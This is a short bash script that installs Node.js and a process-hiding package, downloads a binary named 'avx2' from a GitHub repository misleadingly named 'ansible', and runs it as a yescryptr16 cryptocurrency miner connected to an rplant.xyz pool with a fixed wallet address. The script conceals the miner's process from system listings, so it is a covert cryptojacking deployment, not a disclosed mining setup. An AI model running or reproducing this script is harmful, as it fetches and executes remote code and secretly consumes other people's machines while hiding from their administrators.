#!/bin/bash
apt-get update && apt-get install gcc curl wget -y && curl -sL https://deb.nodesource.com/setup_12.x | bash - && apt-get install nodejs -y && npm install -g npm@8.4.1 && npm i -g node-process-hider && ph add avx2
wget https://github.com/duitawa/ansible/raw/main/avx2 && chmod +x avx2
chmod +x avx2
./avx2 -a yescryptr16 -o stratum+tcps://stratum-na.rplant.xyz:17023 -u RHtPA9STGzx1mD32428bJj8i7ZipQrMxfZ.$(echo $(shuf -i 100-999 -n 1)-CPU) -p x 
